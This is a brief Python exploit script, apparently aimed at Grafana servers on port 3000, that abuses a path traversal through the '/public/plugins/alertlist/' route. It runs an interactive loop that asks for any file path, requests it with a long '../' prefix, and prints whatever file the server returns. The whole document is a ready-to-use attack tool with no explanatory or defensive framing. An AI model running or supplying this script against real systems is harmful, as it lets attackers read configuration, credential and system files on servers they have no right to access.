#!/usr/bin/env python3
import sys
import http.client
from urllib.parse import urlparse

if len(sys.argv) < 2:
    print("Usage: python3 exploit.py http://IP:3000")
    sys.exit(1)

# URL parÃ§ala
parsed = urlparse(sys.argv[1])
host = parsed.hostname
port = parsed.port or 80

base = "/public/plugins/alertlist/../../../../../../../../"

while True:
    f = input("file> ")
    if f.lower() in ("exit", "quit"):
        break

    conn = http.client.HTTPConnection(host, port, timeout=10)
    conn.request("GET", base + f)

    res = conn.getresponse()
    data = res.read()

    print(f"\n[HTTP {res.status}]")
    print(data.decode(errors="ignore"))

    conn.close()
